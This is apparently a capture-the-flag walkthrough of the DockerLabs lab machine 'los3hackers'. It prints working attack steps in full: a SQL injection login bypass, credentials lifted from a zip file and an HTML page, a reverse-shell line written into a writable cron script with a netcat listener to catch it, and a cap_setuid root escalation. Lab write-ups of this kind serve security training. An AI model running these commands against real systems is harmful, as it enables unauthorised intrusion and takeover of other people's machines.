# IP
172.17.0.2
# Recognition
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.033 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 0.033/0.045/0.058/0.012 ms
```
# Port Scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ sudo nmap -sS -sV 172.17.0.2
[sudo] password for codebylauti:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 17:00 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
MAC Address: 72:4F:87:A4:97:D9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```
# Web Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql,zip
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,conf,sh,txt,sql,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
dashboard            (Status: 302) [Size: 208] [--> http://172.17.0.2/]
login                (Status: 200) [Size: 5292]
logout               (Status: 302) [Size: 208] [--> http://172.17.0.2/]
wow.zip              (Status: 403) [Size: 20]
Progress: 36904 / 36904 (100.00%)
===============================================================
Finished
===============================================================
```
# SQLI
Tried multiple common SQLI to bypass login.

```HTTP
POST /login HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin%27+--&password=123
```

Got access to /dashboard after the previous POST
Found the first flag: `{SQLi_bypass_r4t3_l1m1t_pwn3d}`

To access /dashboard/backup we need *super admin* privileges
# Further enumeration
With the admin session we can download wow.zip found in previous fuzzing.

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ curl -H "Cookie: session=eyJyb2xlIjoic3RhZmYiLCJ1c2VybmFtZSI6InNvcG9ydGUifQ.aqcKjQ.pNBgBNTEf8C8sbZqmOP8JF_l41E" http://172.17.0.2/wow.zip --output wow.zip
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    204 100    204   0      0  74889      0                              0

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ ls
auto_deploy.sh  los3hackers.tar  wow.zip

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ unzip wow.zip
Archive:  wow.zip
 extracting: permission.txt

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ cat permission.txt
redhacker:h4ck1NNN62026!!
```

We could login in SHH with those credentials
# Login as redhacker
First hint found
```sh
redhacker@648a9dc13532:~$ cat user.txt
Red...

Ya es la tercera vez que olvidas la contraseña.

No volveré a escribirla por ti en un archivo .zip

La próxima vez revisa el portal interno que tenemos, al menos yo lo ocupo para guardar la mia.

- Blue
```

We should be looking for blue's password in that portal

After enumeration, password was found in an html file
```sh
redhacker@648a9dc13532:/srv/internal$ cat index.html
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SECURE SHELL v2.4.7</title>
</head>
<body>
<div class="terminal">
  <div class="titlebar">
    <div class="titlebar-left">
      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
    </div>
    <div class="titlebar-title">SECURE SHELL v2.4.7</div>
    <div class="titlebar-right">■ LIVE</div>
  </div>
  <div class="body">
    <div class="section-title">Internal Backup Portal</div>
    <hr class="divider">
    <div class="status-line">
      <div class="status-label">Last backup:</div>
      <div class="status-dot"></div>
      <div class="status-value">SUCCESS</div>
    </div>
    <div class="creds-box">
      <div class="creds-heading">// Temporary Credentials</div>
      <div class="cred-row">
        <span class="cred-key">User</span>
        <span class="cred-sep">›</span>
        <span class="cred-val">bluehacker</span>
      </div>
      <div class="cred-row">
        <span class="cred-key">Password</span>
        <span class="cred-sep">›</span>
        <span class="cred-val highlight">xKpIEAE3fkp--</span>
      </div>
    </div>
    <div class="footer">
      <span class="timestamp" id="ts"></span>
      <span style="font-size:11px;color:#2a1a3a;">_<span class="blink"></span></span>
    </div>
  </div>
</div>
<script>
  const el = document.getElementById('ts');
  function update() {
    const now = new Date();
    el.textContent = now.toISOString().replace('T',' ').slice(0,19)+' UTC';
  }
  update();
  setInterval(update, 1000);
</script>
</body>
</html>
```
# Login as bluehacker
Hint found
```sh
bluehacker@648a9dc13532:~$ cat user.txt
Black siempre ha sido desconfiado.

Dice que las tareas importantes
deben ejecutarse solas.

Cada minuto comprueba que todo
siga exactamente como él lo dejó.

Nunca entendí su obsesión.

- Blue
```

Found interesting cron job
```sh
bluehacker@648a9dc13532:/etc/cron.d$ ls -la
total 24
drwxr-xr-x 1 root root 4096 Sep 13 19:57 .
drwxr-xr-x 1 root root 4096 Sep 13 19:57 ..
-rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
-rw-r--r-- 1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r-- 1 root root   44 Sep 13 19:57 maintenance
bluehacker@648a9dc13532:/etc/cron.d$ cat maintenance
* * * * * blackhacker /opt/maintenance/m.sh
```

bluhacker's group has all permitions for /opt/maintenance/m.sh
```sh
bluehacker@648a9dc13532:/opt/maintenance$ ls -la
total 12
drwxr-xr-x 2 root        root       4096 Sep 13 19:57 .
drwxr-xr-x 1 root        root       4096 Sep 13 19:57 ..
-rwxrwxr-x 1 blackhacker bluehacker  124 Sep 13 19:57 m.sh
```

It it possible to modify m.sh to execute a reverse shell and have blackhacker user privileges
```sh

bluehacker@648a9dc13532:/opt/maintenance$ echo "sh -i >& /dev/tcp/172.17.0.1/443 0>&1" > m.sh
```

Then we just have to wait until cron job runs the payload
# Login as blackhacker
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/easy/los3hackers]
└─$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45824
sh: 0: can't access tty; job control turned off
$ whoami
blackhacker
```

Hint
```sh
$ cat user.txt
No confío en contraseñas.

No confío en personas.

Las contraseñas se olvidan.
Las personas cometen errores.

Los privilegios...

Esos sí permanecen.

- Black
```

Got a TTY
```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Find capabilities
```sh
blackhacker@648a9dc13532:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/local/bin/syscheck cap_setuid=ep
```

Exploit syscheck to get root 
```sh

/usr/local/bin/syscheck -c "import os; os.setuid(0); os.system('/bin/bash -p')"
whoami
root
```

Final flag
```sh
cat root.txt
Has llegado hasta aquí.

Red te enseñó que toda aplicación puede fallar.

Blue te recordó que la seguridad nunca termina.

Black demostró que el conocimiento, sin ética,
puede convertirse en un arma.

No resolviste una máquina.

Viviste las tres mentalidades que existen en la
ciberseguridad.

Ahora la pregunta ya no es si sabes hackear.

La pregunta es...

¿Qué clase de hacker quieres ser?

                 — IHATEFW

Gracias por jugar.
```